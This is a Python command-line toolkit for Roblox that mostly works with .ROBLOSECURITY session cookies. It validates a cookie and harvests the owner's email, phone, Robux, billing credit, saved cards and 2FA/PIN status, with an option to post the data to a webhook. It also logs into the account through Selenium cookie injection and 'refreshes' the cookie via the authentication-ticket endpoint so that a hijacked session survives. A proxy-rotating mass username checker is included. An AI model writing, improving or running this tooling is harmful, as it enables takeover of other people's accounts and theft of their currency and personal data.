#!/usr/bin/env python3
# SNOOP Roblox Tools – Ultimate Suite

import os
import sys
import re
import time
import json
import base64
import random
import requests
import threading
import asyncio
import aiohttp
from urllib.parse import quote
from datetime import datetime
from concurrent.futures import ThreadPoolExecutor
from pathlib import Path

try:
    from core.display import Theme, Colorate, get_inpt, clr
except:
    class Theme:
        @staticmethod
        def get_colors():
            return {"head": "\033[95m", "num": "\033[96m", "txt": "\033[97m", "inp": "\033[96m"}
    class Colorate:
        @staticmethod
        def Horizontal(c, t): return f"{c}{t}\033[0m"
    def get_inpt(prompt=None):
        return input(prompt or "> ")
    def clr():
        os.system('cls' if os.name == 'nt' else 'clear')

try:
    from selenium import webdriver
    from selenium.webdriver.chrome.service import Service as ChromeService
    from selenium.webdriver.chrome.options import Options
    from webdriver_manager.chrome import ChromeDriverManager
    SELENIUM = True
except:
    SELENIUM = False

try:
    from colorama import Fore, Style, init
    init(autoreset=True)
except:
    class Fore:
        CYAN = '\033[96m'; MAGENTA = '\033[95m'; GREEN = '\033[92m'
        RED = '\033[91m'; YELLOW = '\033[93m'; RESET = '\033[0m'
    class Style:
        RESET_ALL = '\033[0m'

ROBLOX_API = "https://users.roblox.com/v1"
ROBLOX_ECONOMY = "https://economy.roblox.com/v1"
ROBLOX_GROUPS = "https://groups.roblox.com/v1"
ROBLOX_THUMB = "https://thumbnails.roblox.com/v1"
ROBLOX_AUTH = "https://auth.roblox.com/v1"
ROBLOX_ACCOUNT = "https://accountinformation.roblox.com/v1"
ROBLOX_SETTINGS = "https://accountsettings.roblox.com/v1"
ROBLOX_AVATAR = "https://avatar.roblox.com/v1"
ROBLOX_GAMES = "https://games.roblox.com/v1"
ROBLOX_INVENTORY = "https://inventory.roblox.com/v1"
ROBLOX_FRIENDS = "https://friends.roblox.com/v1"
ROBLOX_BILLING = "https://billing.roblox.com/v1"
ROBLOX_PREMIUM = "https://premiumfeatures.roblox.com/v1"
ROBLOX_TWOSTEP = "https://twostepverification.roblox.com/v1"
ROBLOX_ASSET = "https://assetdelivery.roblox.com/v1"
ROBLOX_API2 = "https://apis.roblox.com"

USER_AGENTS = [
    "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/126.0.0.0 Safari/537.36",
    "Mozilla/5.0 (Macintosh; Intel Mac OS X 10_15_7) AppleWebKit/605.1.15 (KHTML, like Gecko) Version/17.1 Safari/605.1.15",
    "Mozilla/5.0 (X11; Linux x86_64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/125.0.0.0 Safari/537.36",
]

COOKIE_PATTERN = r'(_\|WARNING:-DO-NOT-SHARE-THIS.--Sharing-this-will-allow-someone-to-log-in-as-you-and-to-steal-your-ROBUX-and-items.\|_\S+)'
COOKIE_START = '_|WARNING:-DO-NOT-SHARE-THIS.--Sharing-this-will-allow-someone-to-log-in-as-you-and-to-steal-your-ROBUX-and-items.|_'

def _headers(cookie=None):
    h = {"User-Agent": random.choice(USER_AGENTS)}
    if cookie:
        h["Cookie"] = f".ROBLOSECURITY={cookie}"
    return h

def _clr():
    os.system('cls' if os.name == 'nt' else 'clear')

def _input(prompt):
    return input(f"{Fore.CYAN}{prompt}{Style.RESET_ALL}").strip()

def _print_head(msg):
    print(f"{Fore.MAGENTA}{msg}{Style.RESET_ALL}")

def _print_info(msg):
    print(f"{Fore.CYAN}  [*] {msg}{Style.RESET_ALL}")

def _print_ok(msg):
    print(f"{Fore.GREEN}  [+] {msg}{Style.RESET_ALL}")

def _print_err(msg):
    print(f"{Fore.RED}  [!] {msg}{Style.RESET_ALL}")

def _print_warn(msg):
    print(f"{Fore.YELLOW}  [~] {msg}{Style.RESET_ALL}")

def _sep():
    print(f"{Fore.MAGENTA}  {'─'*60}{Style.RESET_ALL}")

class Roblox:
    @staticmethod
    def _get(url, cookie=None, headers=None):
        try:
            h = _headers(cookie)
            if headers:
                h.update(headers)
            r = requests.get(url, headers=h, timeout=15)
            if r.status_code == 200:
                return r.json()
            return {"error": f"HTTP {r.status_code}"}
        except Exception as e:
            return {"error": str(e)}

    @staticmethod
    def _post(url, data=None, cookie=None, headers=None):
        try:
            h = _headers(cookie)
            if headers:
                h.update(headers)
            r = requests.post(url, headers=h, json=data, timeout=15)
            if r.status_code in [200, 201]:
                return r.json()
            return {"error": f"HTTP {r.status_code}"}
        except Exception as e:
            return {"error": str(e)}

    @staticmethod
    def get_user_info(username):
        r = Roblox._post(f"{ROBLOX_API}/usernames/users", {"usernames": [username], "excludeBannedUsers": False})
        if "error" in r or not r.get("data"):
            return {"error": "User not found"}
        uid = r["data"][0]["id"]
        user = Roblox._get(f"{ROBLOX_API}/users/{uid}")
        if "error" in user:
            return user
        return {
            "id": user.get("id"),
            "username": user.get("name"),
            "display_name": user.get("displayName"),
            "created": user.get("created"),
            "banned": user.get("isBanned"),
            "verified": user.get("hasVerifiedBadge"),
            "description": user.get("description"),
            "profile_url": f"https://roblox.com/users/{uid}/profile",
            "avatar_url": f"https://www.roblox.com/headshot-thumbnail/image?userId={uid}&width=420&height=420&format=png"
        }

    @staticmethod
    def get_cookie_info(cookie, webhook=None):
        r = Roblox._get(f"{ROBLOX_API}/users/authenticated", cookie=cookie)
        if "error" in r:
            return {"error": "Invalid cookie"}
        uid = r.get("id")
        data = {
            "id": uid,
            "username": r.get("name"),
            "display_name": r.get("displayName"),
            "created": r.get("created"),
            "verified": r.get("hasVerifiedBadge")
        }
        rbx = Roblox._get(f"{ROBLOX_ECONOMY}/users/{uid}/currency", cookie=cookie)
        if "error" not in rbx:
            data["robux"] = rbx.get("robux")
        prem = Roblox._get(f"{ROBLOX_PREMIUM}/users/{uid}/validate-membership", cookie=cookie)
        if "error" not in prem:
            data["premium"] = prem
        email = Roblox._get(f"{ROBLOX_ACCOUNT}/email", cookie=cookie)
        if "error" not in email:
            data["email"] = email.get("emailAddress")
            data["email_verified"] = email.get("verified")
        phone = Roblox._get(f"{ROBLOX_SETTINGS}/phone", cookie=cookie)
        if "error" not in phone:
            data["phone"] = phone.get("phone")
            data["phone_verified"] = phone.get("isVerified")
        twofa = Roblox._get(f"{ROBLOX_TWOSTEP}/users/{uid}/configuration", cookie=cookie)
        if "error" not in twofa:
            data["two_fa"] = "Enabled" if twofa.get("is2faEnabled") else "Disabled"
        pin = Roblox._get(f"{ROBLOX_AUTH}/account/pin", cookie=cookie)
        if "error" not in pin:
            data["pin"] = "Enabled" if pin.get("isEnabled") else "Disabled"
        bill = Roblox._get(f"{ROBLOX_BILLING}/credit", cookie=cookie)
        if "error" not in bill:
            data["credit"] = f"{bill.get('balance', 0)} {bill.get('currencyCode', 'USD')} ({bill.get('robuxAmount', 0)} R$)"
        cards = Roblox._get(f"{ROBLOX_API2}/payments-gateway/v1/payment-profiles", cookie=cookie)
        if "error" not in cards:
            data["cards"] = len(cards)
        created = data.get("created")
        if created:
            try:
                dt = datetime.fromisoformat(created.replace('Z', '+00:00'))
                data["age_days"] = (datetime.now().astimezone() - dt).days
            except:
                pass
        groups = Roblox._get(f"{ROBLOX_GROUPS}/users/{uid}/groups/roles", cookie=cookie)
        if "error" not in groups:
            owned = 0
            total = 0
            for g in groups.get("data", []):
                total += 1
                if g.get("role", {}).get("rank") == 255:
                    owned += 1
            data["groups_total"] = total
            data["groups_owned"] = owned
        friends = Roblox._get(f"{ROBLOX_FRIENDS}/users/{uid}/friends/count", cookie=cookie)
        if "error" not in friends:
            data["friends"] = friends.get("count")
        avatar = Roblox._get(f"{ROBLOX_AVATAR}/users/{uid}/currently-wearing", cookie=cookie)
        if "error" not in avatar:
            data["wearing"] = len(avatar.get("assetIds", []))
        return data

    @staticmethod
    def cookie_login(cookie):
        if not SELENIUM:
            return {"error": "Selenium not installed"}
        try:
            opts = Options()
            opts.add_experimental_option("detach", True)
            service = ChromeService(ChromeDriverManager().install())
            driver = webdriver.Chrome(service=service, options=opts)
            driver.get("https://www.roblox.com/login")
            driver.add_cookie({"name": ".ROBLOSECURITY", "value": cookie, "domain": ".roblox.com", "path": "/"})
            driver.refresh()
            driver.get("https://www.roblox.com/home")
            return {"success": True, "driver": driver}
        except Exception as e:
            return {"error": str(e)}

    @staticmethod
    def refresh_cookie(cookie):
        def _parse(s):
            match = re.search(COOKIE_PATTERN, s)
            if match:
                return match.group(1)
            if len(s) >= 100:
                return COOKIE_START + s
            return None
        ck = _parse(cookie)
        if not ck:
            return {"error": "Invalid cookie format"}
        r1 = requests.post(f"{ROBLOX_AUTH}/v2/logout", headers=_headers(ck))
        csrf = r1.headers.get("x-csrf-token")
        if not csrf:
            return {"error": "Could not get CSRF token"}
        headers_ticket = _headers(ck)
        headers_ticket.update({
            "RBXauthenticationNegotiation": "1",
            "referer": "https://www.roblox.com/hewhewhew",
            "X-CSRF-Token": csrf
        })
        for _ in range(5):
            r2 = requests.post(f"{ROBLOX_AUTH}/v1/authentication-ticket", headers=headers_ticket, json={})
            ticket = r2.headers.get("rbx-authentication-ticket")
            if ticket:
                break
            new_csrf = r2.headers.get("x-csrf-token")
            if new_csrf:
                headers_ticket["X-CSRF-Token"] = new_csrf
            time.sleep(0.5)
        if not ticket:
            return {"error": "Could not get authentication ticket"}
        headers_redeem = _headers(ck)
        headers_redeem.update({"RBXauthenticationNegotiation": "1"})
        r3 = requests.post(f"{ROBLOX_AUTH}/v1/authentication-ticket/redeem",
                          json={"authenticationTicket": ticket}, headers=headers_redeem)
        set_cookie = r3.headers.get("Set-Cookie", "")
        new_match = re.search(COOKIE_PATTERN, set_cookie)
        if not new_match:
            return {"error": "Could not generate new cookie"}
        new_cookie = new_match.group(1)
        headers_logout = _headers(ck)
        headers_logout.update({"X-CSRF-Token": csrf})
        requests.post(f"{ROBLOX_AUTH}/v2/logout", headers=headers_logout)
        return {"success": True, "new_cookie": new_cookie}

    @staticmethod
    def get_group_info(group_id):
        r = Roblox._get(f"{ROBLOX_GROUPS}/groups/{group_id}")
        if "error" in r:
            return {"error": "Group not found"}
        return {
            "id": r.get("id"),
            "name": r.get("name"),
            "description": r.get("description"),
            "owner": r.get("owner", {}).get("username"),
            "owner_id": r.get("owner", {}).get("id"),
            "members": r.get("memberCount"),
            "public": r.get("publicEntryAllowed"),
            "locked": r.get("isLocked"),
            "verified": r.get("hasVerifiedBadge"),
            "created": r.get("created"),
            "url": f"https://roblox.com/groups/{group_id}"
        }

    @staticmethod
    def download_asset(asset_id, output_dir="output"):
        r = requests.get(f"{ROBLOX_ASSET}/asset/?id={asset_id}", headers=_headers(), timeout=30)
        if r.status_code != 200:
            return {"error": f"HTTP {r.status_code}"}
        os.makedirs(output_dir, exist_ok=True)
        path = os.path.join(output_dir, f"asset_{asset_id}.rbxm")
        with open(path, "wb") as f:
            f.write(r.content)
        return {"success": True, "path": path}

    @staticmethod
    def get_name_history(username):
        r = Roblox._post(f"{ROBLOX_API}/usernames/users", {"usernames": [username]})
        if "error" in r or not r.get("data"):
            return {"error": "User not found"}
        uid = r["data"][0]["id"]
        hist = Roblox._get(f"{ROBLOX_API}/users/{uid}/username-history?limit=50&sortOrder=Desc")
        if "error" in hist:
            return hist
        return {"user": username, "id": uid, "history": [h.get("name") for h in hist.get("data", [])]}

    @staticmethod
    async def check_username_async(username, proxy=None):
        url = f"{ROBLOX_AUTH}/usernames/validate?username={quote(username)}&birthday=2000-01-01"
        headers = {"User-Agent": random.choice(USER_AGENTS)}
        try:
            async with aiohttp.ClientSession() as session:
                proxy_url = f"http://{proxy}" if proxy else None
                async with session.get(url, headers=headers, proxy=proxy_url, timeout=15) as resp:
                    if resp.status == 429:
                        return {"username": username, "available": None, "error": "rate_limited"}
                    if resp.status != 200:
                        return {"username": username, "available": None, "error": f"HTTP {resp.status}"}
                    data = await resp.json()
                    code = data.get("code")
                    return {
                        "username": username,
                        "available": code == 0,
                        "code": code,
                        "message": data.get("message", "")
                    }
        except Exception as e:
            return {"username": username, "available": None, "error": str(e)}

    @staticmethod
    def check_usernames(usernames, concurrency=50, proxies=None):
        results = {"available": [], "taken": [], "errors": []}
        async def _run():
            sem = asyncio.Semaphore(concurrency)
            async def _check(u):
                async with sem:
                    proxy = random.choice(proxies) if proxies else None
                    return await Roblox.check_username_async(u, proxy)
            tasks = [asyncio.create_task(_check(u)) for u in usernames]
            for task in asyncio.as_completed(tasks):
                r = await task
                if r.get("available") is True:
                    results["available"].append(r["username"])
                    _print_ok(f"Available: {r['username']}")
                elif r.get("available") is False:
                    results["taken"].append(r["username"])
                    _print_warn(f"Taken: {r['username']}")
                else:
                    results["errors"].append(r)
                    _print_err(f"Error: {r.get('username')} - {r.get('error')}")
        if sys.platform == "win32":
            asyncio.set_event_loop_policy(asyncio.WindowsSelectorEventLoopPolicy())
        asyncio.run(_run())
        return results

    @staticmethod
    def generate_usernames(length=5, count=50000, allow_underscore=False, pattern=None):
        chars = "abcdefghijklmnopqrstuvwxyz"
        if not pattern:
            chars += "0123456789"
            if allow_underscore:
                chars += "_"
        usernames = set()
        attempts = 0
        max_attempts = count * 10
        while len(usernames) < count and attempts < max_attempts:
            attempts += 1
            if pattern:
                name = pattern.replace("?", random.choice(chars))
            else:
                name = "".join(random.choices(chars, k=length))
            if not any(c.isalnum() for c in name):
                continue
            if name.startswith("_") or name.endswith("_"):
                continue
            if "__" in name:
                continue
            usernames.add(name)
        return list(usernames)

def main():
    while True:
        _clr()
        _print_head("\n  ╔═══════════════════════════════════════╗")
        _print_head("  ║     SNOOP ROBLOX TOOLS SUITE        ║")
        _print_head("  ╚═══════════════════════════════════════╝")
        print(f"""
  {Fore.YELLOW}[01]{Style.RESET_ALL} User Info
  {Fore.YELLOW}[02]{Style.RESET_ALL} Cookie Info
  {Fore.YELLOW}[03]{Style.RESET_ALL} Cookie Login
  {Fore.YELLOW}[04]{Style.RESET_ALL} Cookie Refresher
  {Fore.YELLOW}[05]{Style.RESET_ALL} Group Info
  {Fore.YELLOW}[06]{Style.RESET_ALL} Asset Download
  {Fore.YELLOW}[07]{Style.RESET_ALL} Name History
  {Fore.YELLOW}[08]{Style.RESET_ALL} Username Checker
  {Fore.YELLOW}[09]{Style.RESET_ALL} Generate Usernames
  {Fore.YELLOW}[10]{Style.RESET_ALL} Back
        """)
        choice = _input("Choice: ")
        if choice in ["01", "1"]:
            username = _input("Roblox Username: ")
            if not username:
                _print_err("Username required")
                input("Press Enter...")
                continue
            _print_info(f"Fetching {username}...")
            data = Roblox.get_user_info(username)
            if "error" in data:
                _print_err(data["error"])
            else:
                _sep()
                for k, v in data.items():
                    print(f"  {Fore.CYAN}{k}:{Style.RESET_ALL} {v}")
                _sep()
            input("Press Enter...")
        elif choice in ["02", "2"]:
            cookie = _input("Roblox Cookie: ")
            if not cookie:
                _print_err("Cookie required")
                input("Press Enter...")
                continue
            webhook = _input("Webhook URL (optional): ")
            _print_info("Validating cookie...")
            data = Roblox.get_cookie_info(cookie)
            if "error" in data:
                _print_err(data["error"])
            else:
                _sep()
                for k, v in data.items():
                    print(f"  {Fore.CYAN}{k}:{Style.RESET_ALL} {v}")
                _sep()
                if webhook:
                    try:
                        embed = {
                            "embeds": [{
                                "title": "Roblox Account Info",
                                "color": 0x00A3FF,
                                "fields": [{"name": k, "value": str(v), "inline": True} for k, v in data.items()],
                                "footer": {"text": "SNOOP Roblox Tools"}
                            }]
                        }
                        requests.post(webhook, json=embed, timeout=10)
                        _print_ok("Data sent to webhook")
                    except:
                        _print_err("Failed to send webhook")
            input("Press Enter...")
        elif choice in ["03", "3"]:
            cookie = _input("Roblox Cookie: ")
            if not cookie:
                _print_err("Cookie required")
                input("Press Enter...")
                continue
            _print_info("Launching browser...")
            result = Roblox.cookie_login(cookie)
            if "error" in result:
                _print_err(result["error"])
            else:
                _print_ok("Logged in! Browser remains open.")
            input("Press Enter...")
        elif choice in ["04", "4"]:
            cookie = _input("Roblox Cookie: ")
            if not cookie:
                _print_err("Cookie required")
                input("Press Enter...")
                continue
            _print_info("Refreshing cookie...")
            result = Roblox.refresh_cookie(cookie)
            if "error" in result:
                _print_err(result["error"])
            else:
                _print_ok("New cookie generated:")
                _sep()
                print(f"{Fore.GREEN}{result['new_cookie']}{Style.RESET_ALL}")
                _sep()
                os.makedirs("output", exist_ok=True)
                path = f"output/refreshed_cookie_{int(time.time())}.txt"
                with open(path, "w") as f:
                    f.write(result["new_cookie"])
                _print_ok(f"Saved to {path}")
            input("Press Enter...")
        elif choice in ["05", "5"]:
            gid = _input("Group ID: ")
            if not gid:
                _print_err("Group ID required")
                input("Press Enter...")
                continue
            data = Roblox.get_group_info(gid)
            if "error" in data:
                _print_err(data["error"])
            else:
                _sep()
                for k, v in data.items():
                    print(f"  {Fore.CYAN}{k}:{Style.RESET_ALL} {v}")
                _sep()
            input("Press Enter...")
        elif choice in ["06", "6"]:
            aid = _input("Asset ID: ")
            if not aid:
                _print_err("Asset ID required")
                input("Press Enter...")
                continue
            _print_info("Downloading asset...")
            result = Roblox.download_asset(aid)
            if "error" in result:
                _print_err(result["error"])
            else:
                _print_ok(f"Saved to {result['path']}")
            input("Press Enter...")
        elif choice in ["07", "7"]:
            username = _input("Roblox Username: ")
            if not username:
                _print_err("Username required")
                input("Press Enter...")
                continue
            _print_info(f"Fetching name history for {username}...")
            data = Roblox.get_name_history(username)
            if "error" in data:
                _print_err(data["error"])
            else:
                _sep()
                print(f"  {Fore.CYAN}Username:{Style.RESET_ALL} {data['user']}")
                print(f"  {Fore.CYAN}ID:{Style.RESET_ALL} {data['id']}")
                print(f"  {Fore.CYAN}History:{Style.RESET_ALL}")
                for i, name in enumerate(data["history"], 1):
                    print(f"    {i}. {name}")
                _sep()
            input("Press Enter...")
        elif choice in ["08", "8"]:
            usernames_file = _input("Usernames file (input/roblox_usernames.txt): ") or "input/roblox_usernames.txt"
            proxies_file = _input("Proxies file (input/proxies.txt): ") or "input/proxies.txt"
            if not os.path.exists(usernames_file):
                _print_err(f"File not found: {usernames_file}")
                input("Press Enter...")
                continue
            with open(usernames_file, "r") as f:
                usernames = [line.strip() for line in f if line.strip() and not line.startswith("#")]
            if not usernames:
                _print_err("No usernames found")
                input("Press Enter...")
                continue
            proxies = []
            if os.path.exists(proxies_file):
                with open(proxies_file, "r") as f:
                    proxies = [line.strip() for line in f if line.strip() and not line.startswith("#")]
            _print_info(f"Checking {len(usernames)} usernames...")
            results = Roblox.check_usernames(usernames, concurrency=50, proxies=proxies if proxies else None)
            _sep()
            _print_ok(f"Available: {len(results['available'])}")
            _print_warn(f"Taken: {len(results['taken'])}")
            _print_err(f"Errors: {len(results['errors'])}")
            if results["available"]:
                os.makedirs("output", exist_ok=True)
                with open("output/roblox_available.txt", "w") as f:
                    f.write("\n".join(results["available"]))
                _print_ok("Saved to output/roblox_available.txt")
            _sep()
            input("Press Enter...")
        elif choice in ["09", "9"]:
            length = int(_input("Length (5): ") or 5)
            count = int(_input("Count (50000): ") or 50000)
            allow_underscore = _input("Allow underscores? (y/n): ").lower() == 'y'
            pattern = _input("Pattern (? = random char, e.g. test?): ") or None
            os.makedirs("input", exist_ok=True)
            _print_info(f"Generating {count} usernames...")
            names = Roblox.generate_usernames(length, count, allow_underscore, pattern)
            with open("input/roblox_usernames.txt", "w") as f:
                f.write("\n".join(names))
            _print_ok(f"Generated {len(names)} usernames saved to input/roblox_usernames.txt")
            input("Press Enter...")
        elif choice in ["10", "99"]:
            break
        else:
            _print_err("Invalid choice")
            input("Press Enter...")

if __name__ == "__main__":
    main()